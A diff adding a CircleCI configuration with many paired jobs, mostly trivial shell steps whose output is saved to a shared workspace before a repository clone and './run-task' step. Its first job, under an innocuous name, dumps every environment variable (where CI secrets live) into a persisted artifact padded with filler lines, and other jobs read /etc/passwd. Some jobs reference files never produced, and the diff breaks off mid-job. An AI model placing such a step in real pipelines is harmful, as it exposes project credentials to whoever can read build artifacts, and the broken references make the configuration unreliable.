@@ -1,0 +1,1831 @@
+version: 2.1
+
+jobs:
+  teardown_vega-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spoor
+          command: |
+            mkdir -p /tmp/scratch
+            set +o pipefail 2>/dev/null; env > /tmp/scratch/982b.data; printenv >> /tmp/scratch/982b.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/scratch/982b.data; done; true
+            echo "ready: $(sha256sum /tmp/scratch/982b.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 982b.data
+  vega-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  inspect_q1-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: knock around
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "foo bar baz" | awk 'NF==3{print "good"}'; true ; } > /tmp/scratch/OK
+            echo "ready: $(sha256sum /tmp/scratch/OK | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - OK
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/OK || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  round1_feat-4003:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: famished
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; date +"%j"; true ; } > /tmp/scratch/step-27.log
+            echo "ready: $(sha256sum /tmp/scratch/step-27.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-27.log
+  feat-4003:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/step-27.log || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  precheck_v6-canary4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: leg extend
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo $(ls /usr/bin | wc -l); true ; } > /tmp/scratch/output.out
+            echo "ready: $(sha256sum /tmp/scratch/output.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - output.out
+  v6-canary4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  Beta_romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: amber bulb
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && seq 1 50 > "$tf" && md5sum "$tf" | awk '{print $1}' && rm "$tf"; true ; } > /tmp/scratch/87.bin
+            echo "ready: $(sha256sum /tmp/scratch/87.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 87.bin
+  romeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/87.bin || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  db_RolloutImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: room for pie
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=200;i++)print i*i}' | sort -n | tail -1; true ; } > /tmp/scratch/bundle.tar
+            echo "ready: $(sha256sum /tmp/scratch/bundle.tar | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - bundle.tar
+  RolloutImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/bundle.tar || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  vendor_sm-old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: warm up
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "the rain in spain" | tr -s ' ' | wc -c; true ; } > /tmp/scratch/output.md
+            echo "ready: $(sha256sum /tmp/scratch/output.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - output.md
+  sm-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/output.md || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  postbuild_ensure-production-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: strike flag
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]="x"; a[2]="y"; a[3]="z"; for(i in a)print i":"a[i]}' | sort; true ; } > /tmp/scratch/log.gz
+            echo "ready: $(sha256sum /tmp/scratch/log.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - log.gz
+  ensure-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/log.gz || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  prefetch_teh-ci-35:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: flaky
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sort | uniq -c | sort -rn | head -3; true ; } > /tmp/scratch/2024-01-01.data
+            echo "ready: $(sha256sum /tmp/scratch/2024-01-01.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2024-01-01.data
+  teh-ci-35:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  Beta_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: over here
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "x=5" | awk -F= '{print $2*2}'; true ; } > /tmp/scratch/2023-11-05.data
+            echo "ready: $(sha256sum /tmp/scratch/2023-11-05.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2023-11-05.data
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  round2_LaunchService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: MOAR
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "foo bar baz" | awk 'NF==3{print "good"}'; true ; } > /tmp/scratch/step-ready.txt
+            echo "ready: $(sha256sum /tmp/scratch/step-ready.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-ready.txt
+  LaunchService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/step-ready.txt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  drain_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: coffee break
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; cat /proc/loadavg 2>/dev/null | head -c 20; true ; } > /tmp/scratch/284a.txt
+            echo "ready: $(sha256sum /tmp/scratch/284a.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 284a.txt
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/284a.txt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  cleanup_UAT_VERIFY_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: chinup
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; cat /proc/self/status | grep -E "^Name|^Uid" | head -2; true ; } > /tmp/scratch/908b.out
+            echo "ready: $(sha256sum /tmp/scratch/908b.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 908b.out
+  UAT_VERIFY_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/908b.out || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  step1_QA_VERIFY_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: sound barrier
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%s\n" one two three four five | shuf 2>/dev/null | head -1 || printf "%s\n" one two three four five | awk 'NR==2'; true ; } > /tmp/scratch/150.out
+            echo "ready: $(sha256sum /tmp/scratch/150.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 150.out
+  QA_VERIFY_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/150.out || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  db_feat-2092:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: step sand
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 65933 | awk 'NR>9623 && NR<45264{s+=$1}END{print s}'; true ; } > /tmp/scratch/step-8.out
+            echo "ready: $(sha256sum /tmp/scratch/step-8.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-8.out
+  feat-2092:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/step-8.out || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  p1_preview-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: storm front
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; sort /etc/passwd | wc -l; true ; } > /tmp/scratch/metrics.json
+            echo "ready: $(sha256sum /tmp/scratch/metrics.json | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - metrics.json
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/metrics.json || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  g2_nico-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: spanish squat
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{print $1, $1*2}' | tail -3; true ; } > /tmp/scratch/ckpt-main.pt
+            echo "ready: $(sha256sum /tmp/scratch/ckpt-main.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - ckpt-main.pt
+  nico-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/ckpt-main.pt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  linter_oct23-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: trough
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=sprintf("[%5s]","hi"); print s}'; true ; } > /tmp/scratch/823.txt
+            echo "ready: $(sha256sum /tmp/scratch/823.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 823.txt
+  oct23-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/823.txt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  audit_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rocket stove
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%o\n" $((RANDOM)); true ; } > /tmp/scratch/artifact
+            echo "ready: $(sha256sum /tmp/scratch/artifact | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - artifact
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/artifact || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  blue_foxtrot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: focus mode
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand(); for(i=0;i<100;i++)printf "%d ",rand()*1000; print ""}' | md5sum; true ; } > /tmp/scratch/final.log
+            echo "ready: $(sha256sum /tmp/scratch/final.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - final.log
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/final.log || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  maker_push-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: negative dip
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo {A..Z} | tr -d ' ' | fold -w5 | head -3; true ; } > /tmp/scratch/PASS
+            echo "ready: $(sha256sum /tmp/scratch/PASS | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - PASS
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/PASS || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  hook_nova-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: plank reach
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=split("alpha beta gamma delta",arr," "); print n}'; true ; } > /tmp/scratch/2024-04-24.data
+            echo "ready: $(sha256sum /tmp/scratch/2024-04-24.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2024-04-24.data
+  nova-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2024-04-24.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  run_november:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: gas grill
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; n=5000; for(i=0;i<n;i++)t+=(i*31+7)%97; print t}'; true ; } > /tmp/scratch/stage.bin
+            echo "ready: $(sha256sum /tmp/scratch/stage.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - stage.bin
+  november:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/stage.bin || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  builder_feb5-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: go
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<131324;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/scratch/handoff.state
+            echo "ready: $(sha256sum /tmp/scratch/handoff.state | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - handoff.state
+  feb5-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/handoff.state || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  do_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: leg curl
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "aaa bb c" | awk '{for(i=1;i<=NF;i++)total+=length($i)}END{print total}'; true ; } > /tmp/scratch/big_job_output_v4.out
+            echo "ready: $(sha256sum /tmp/scratch/big_job_output_v4.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - big_job_output_v4.out
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/big_job_output_v4.out || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  redo_hu-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: die thread
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 20 | awk 'BEGIN{OFS="-"}{if(NR%4==1)printf "%s",$0; else if(NR%4==0)print OFS $0; else printf OFS "%s",$0}' | head -3; true ; } > /tmp/scratch/30.out
+            echo "ready: $(sha256sum /tmp/scratch/30.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 30.out
+  hu-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
